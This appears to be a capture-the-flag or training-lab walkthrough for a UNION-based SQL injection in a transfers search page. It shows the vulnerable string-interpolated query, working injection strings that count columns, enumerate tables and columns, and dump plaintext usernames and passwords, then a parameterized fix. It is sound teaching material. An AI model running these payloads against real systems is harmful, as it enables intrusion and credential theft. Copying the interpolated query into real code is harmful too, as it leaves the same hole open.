# Level 1-3: UNION-based DB Enumeration

**URL:** `/dashboard/transfers`

**Objective:** Use UNION injection to enumerate the database structure and extract credentials from the `jumentususers` table.

## Vulnerable Code

```python
query = f"SELECT * FROM transfers WHERE nome LIKE '%{search}%'"
cur.execute(query)
```

The `search` parameter is interpolated directly. The query returns 10 columns, all injectable via UNION SELECT.

## Attack Chain

### Step 1 — Determine column count

Inject `ORDER BY` with increasing numbers until the query errors:

```sql
' ORDER BY 10--   → works
' ORDER BY 11--   → ERROR: column 11 does not exist (even if the page didn't show the error, if the query errors, it means the column count is less than the number specified)
```

The query has **10 columns**.

### Step 2 — Confirm UNION injection point

```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
```

Returns a row of nulls — confirms injection works.

### Step 3 — Enumerate tables

```sql
' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
```

This creates shows an error `UNION types integer and name cannot be matched` because the `id` column is an integer, but `table_name` is a string. To fix this, we can put `table_name` on a column that corresponds to a string (e.g. the second column):


```sql
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables--
```

The `jogador` column of injected rows will contain table names: `jumentususers`, `entradas`, `transfers`. This UNION injection enables many other queries to enumerate the database structure and extract data. Basically, it's game over at this point, but let's see a few more examples. (Keep in mind this could have been done in the level 1-2 as well...)

### Step 4 — Enumerate columns of `jumentususers`

```sql
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='jumentususers'--
```

Returns: `id`, `username`, `password`, `role`.

### Step 5 — Dump credentials

```sql
' UNION SELECT NULL,username,password,role,NULL,NULL,NULL,NULL,NULL,NULL FROM jumentususers--
```

Returns all usernames and plaintext passwords from the `jumentususers` table. We can now login as user `cristiano` to complete the level.

## Fixed Code

```python
query = "SELECT id, nome, origem, destino, valor FROM transfers WHERE nome LIKE %s"
cur.execute(query, (f"%{search}%",))
```

Parameterized query prevents any injected SQL from being interpreted as query logic.
